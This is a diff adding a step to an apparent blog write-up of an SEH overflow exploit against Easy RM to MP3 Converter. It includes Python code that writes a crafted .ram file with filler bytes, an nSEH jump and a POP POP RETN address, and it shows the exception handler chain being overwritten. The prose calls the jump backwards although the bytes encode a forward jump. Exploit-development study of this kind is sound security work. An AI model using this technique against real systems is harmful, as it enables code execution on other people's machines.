@@ -97,3 +97,22 @@ Despite the great variety of possible modules to pick in order to find a reliabl
 Listing possible POP POP RETN sequences within the module "RM2MP3Converter.exe":
 
 ![](/assets/img/Findings2/8-2.png)
+
+The first address is chosen and copied within the PoC. Furthermore, a short jump backwards is added:
+
+```term_session
+import struct
+
+nseh = "\xEB\x06\x90\x90"
+seh = "\x3C\x56\x40" # 0x0040563c : pop ebx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [RM2MP3Converter.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.7.3.700 (C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe)
+
+buffer = "A" * 45388 + nseh + seh
+
+f = open ("finding2.ram", "w")
+f.write(buffer)
+f.close()
+```
+
+After the process is yet once again re-done, the SEH Chain is overwritten by the short jump, and by the POP-POP-RETN sequence, meaning that the overwritting: method has successfully worked.
+
+![](/assets/img/Findings2/9.png)
